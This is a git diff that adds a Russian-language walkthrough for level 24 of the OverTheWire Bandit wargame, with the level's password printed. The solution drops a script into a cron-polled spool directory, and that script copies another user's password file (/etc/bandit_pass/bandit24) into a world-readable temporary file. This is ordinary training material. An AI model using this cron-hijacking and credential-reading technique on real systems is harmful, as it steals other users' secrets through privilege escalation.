@@ -493,3 +493,38 @@ cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
 `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`
 
 </details> 
+
+## Level 24
+
+**Описание:**  
+`Программа автоматически запускается через равные промежутки времени с помощью cron — планировщика заданий по расписанию. Найдите в /etc/cron.d/ конфигурацию и посмотрите, какая команда выполняется.`  
+
+`ПРИМЕЧАНИЕ. На этом уровне вам нужно создать свой первый скрипт. Это очень важный шаг, и вы должны гордиться собой, когда пройдете этот уровень!`  
+
+`ПРИМЕЧАНИЕ 2. Помните, что после выполнения скрипт удаляется, поэтому лучше сохранить его копию…`
+
+<details>
+    <summary>Решение</summary>  
+
+```
+head /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh 
+cd $(mktemp -d)
+vim script.sh
+chmod +x script.sh
+chmod -R 777 $PWD
+cp script.sh /var/spool/bandit24/foo/script.sh
+cat bandit24
+```  
+
+***script.sh:***
+```
+#!/bin/bash
+echo "$(cat /etc/bandit_pass/bandit24)" > /tmp/tmp.1EFi0VknDX/bandit24
+chmod 777 /tmp/tmp.1EFi0VknDX/bandit24
+```
+
+**Результат**:  
+`gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+</details> 
